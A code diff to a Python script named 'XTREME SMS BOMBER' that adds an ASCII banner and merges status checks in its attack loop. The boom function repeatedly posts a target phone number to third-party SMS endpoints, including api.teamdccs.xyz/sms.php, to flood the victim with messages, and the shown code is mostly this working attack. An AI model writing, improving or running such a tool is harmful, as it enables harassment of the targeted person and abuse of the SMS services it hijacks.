@@ -5,12 +5,19 @@ import sys
 
 def logo():
     x = """
+           ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
+           ╚██╗██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
+            ╚███╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝
+            ██╔██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
+           ██╔╝ ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
+           ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
+                                                
            "TOOL":"XTREME SMS BOMBER",
            "OWNER":"@tm_xtreme"
            "VERSION":"1.0"
            "THREAD":"60"
     """
-    print(x)
+    print("\033[1;34m" + x + "\033[0m")  # Use ANSI escape codes for styling
 
 def linex():
     print("-" * 40)
@@ -60,20 +67,12 @@ def boom(nmbr, lmt):
             url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
             
             req1 = requests.post(url1, headers=head1, json=data1)
-            if req1.status_code == 200:
-                send += 1
-                print(f"\r[API-1]> STATUS : [200]>[{send}]")
-                linex()
-            else:
-                pass
-            
             req2 = requests.get(url2)
-            if req2.status_code == 200:
+
+            if req1.status_code == 200 or req2.status_code == 200:
                 send += 1
-                print(f"\r[API-2]> STATUS : [200]>[{send}]")
+                print(f"\r[API]> STATUS : [200]>[{send}]")
                 linex()
-            else:
-                pass
     except Exception as e:
         print(e)
 
